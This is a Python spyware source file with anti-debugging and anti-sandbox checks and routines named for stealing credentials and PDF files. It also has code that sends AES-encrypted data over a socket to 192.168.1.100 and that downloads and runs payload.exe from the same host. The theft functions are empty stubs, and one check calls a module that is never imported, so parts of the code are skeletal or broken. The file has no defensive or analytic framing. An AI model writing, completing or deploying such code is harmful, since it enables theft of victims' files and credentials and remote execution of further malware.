import os
import sys
import socket
import time
import random
import requests
import base64
import hashlib
import struct
import subprocess
import urllib.request
from Crypto.Cipher import AES

def check_debugger():
    try:
        win32process.GetPriorityClass(win32process.GetCurrentProcess())
    except:
        return True

def anti_sandbox():
    if any(x in os.getenv('PATH') for x in ('VBOX', 'VirtualBox', 'WinXP', 'Windows XP')):
        sys.exit()

    if os.path.exists('C:\\ProgramData\\Microsoft\\Windows\\Templates\\sandbox'):
        sys.exit()

def steal_credentials():
    return {}

def steal_files(path, extension=None):
    return []

def send_stolen_data(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.100', 12345))
    s.sendall(struct.pack('<Q', len(ciphertext)) + ciphertext + struct.pack('<Q', len(tag)) + tag)
    s.close()

def download_and_run_payload(url, filepath):
    urllib.request.urlretrieve(url, filepath)
    subprocess.Popen(filepath)

def spyware_main():
    if check_debugger():
        sys.exit()

    anti_sandbox()

    credentials = steal_credentials()
    files = steal_files('C:\\Users', '.pdf')

    download_and_run_payload('http://192.168.1.100/payload.exe', 'C:\\Windows\\Temp\\payload.exe')

    key = b'0123456789012345'  # Llave AES de 128 bits
    for file_path, file_size in files:
        with open(file_path, 'rb') as f:
            data = f.read()
            send_stolen_data(data, key)

    for credential in credentials.items():
        credential_data = f'{credential[0]}:{credential[1]}'
        send_stolen_data(credential_data.encode(), key)

if __name__ == '__main__':
    spyware_main()
